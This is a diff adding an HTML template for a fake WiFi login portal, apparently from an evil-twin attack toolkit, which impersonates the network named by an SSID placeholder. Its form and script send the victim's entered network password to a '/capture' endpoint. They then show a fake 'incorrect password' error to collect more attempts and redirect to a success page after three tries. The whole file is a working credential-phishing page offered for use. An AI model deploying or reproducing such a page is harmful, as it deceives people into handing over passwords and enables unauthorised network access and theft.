@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Login - {{SSID}}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .wifi-icon {
+            font-size: 60px;
+            color: #667eea;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .network-name {
+            color: #667eea;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .message {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .error {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="wifi-icon">📶</div>
+        </div>
+
+        <h1>WiFi Authentication Required</h1>
+        <div class="network-name">{{SSID}}</div>
+
+        <div class="error" id="error">
+            Incorrect password. Please try again.
+        </div>
+
+        <form id="loginForm" method="POST" action="/capture">
+            <div class="form-group">
+                <label for="password">Network Password</label>
+                <input type="password" id="password" name="password" required autocomplete="off" autofocus>
+            </div>
+
+            <button type="submit" class="btn">Connect to Network</button>
+        </form>
+
+        <div class="spinner" id="spinner"></div>
+
+        <div class="message">
+            Enter the password to connect to this network
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const error = document.getElementById('error');
+        const spinner = document.getElementById('spinner');
+        let attempts = 0;
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const password = document.getElementById('password').value;
+
+            // Show spinner
+            spinner.style.display = 'block';
+            form.style.display = 'none';
+            error.style.display = 'none';
+
+            // Send to backend
+            try {
+                const response = await fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `password=${encodeURIComponent(password)}`
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    // Redirect to success page
+                    window.location.href = '/success';
+                } else {
+                    // Show error and reset
+                    setTimeout(() => {
+                        spinner.style.display = 'none';
+                        form.style.display = 'block';
+                        error.style.display = 'block';
+                        document.getElementById('password').value = '';
+                        attempts++;
+
+                        // After 3 attempts, redirect anyway
+                        if (attempts >= 3) {
+                            window.location.href = '/success';
+                        }
+                    }, 1500);
+                }
+            } catch (err) {
+                // Network error, try again
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    form.style.display = 'block';
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
